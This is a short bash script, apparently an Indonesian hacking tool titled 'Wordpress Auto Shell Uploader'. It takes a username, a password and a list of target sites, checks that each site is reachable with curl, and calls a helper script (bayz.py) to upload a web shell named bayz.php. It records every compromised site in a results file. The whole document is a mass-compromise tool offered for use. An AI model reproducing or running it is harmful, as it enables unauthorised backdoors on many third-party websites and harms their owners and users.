#!/bin/bash
# Coded By Bayz21
function exploit() {
    ceker=$(timeout 10 curl -s --write-out %{http_code} -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36" --output /dev/null $1);
    if [[ $ceker =~ '200' ]] || [[ $ceker =~ '302' ]] || [[ $ceker =~ '301' ]]; then
        upshl=$(timeout 10 python bayz.py -t $1 -u $user -p $pass);
        if [[ $upshl =~ 'bayz.php' ]]; then
            echo "[Success] => $upshl";
			echo "$upshl" >> hasil.txt
        else
            echo "[Fail] $1";
        fi
    else
        echo "[Website Die]" $1;
fi

}
cat << "VOSS"


██████╗  █████╗ ██╗   ██╗███████╗██████╗  ██╗
██╔══██╗██╔══██╗╚██╗ ██╔╝╚══███╔╝╚════██╗███║
██████╔╝███████║ ╚████╔╝   ███╔╝  █████╔╝╚██║
██╔══██╗██╔══██║  ╚██╔╝   ███╔╝  ██╔═══╝  ██║
██████╔╝██║  ██║   ██║   ███████╗███████╗ ██║
╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚══════╝ ╚═╝
---------------------------------------------
------- Wordpress Auto Shell Uploader -------
---------------------------------------------

VOSS
echo -n "Masukan Username : " ;
read user
echo -n "Masukan Password : " ;
read pass
echo -n "Masukan List Web : ";
read list
echo "Running :3";
for target in $(cat $list); do
    exploit $target;
done
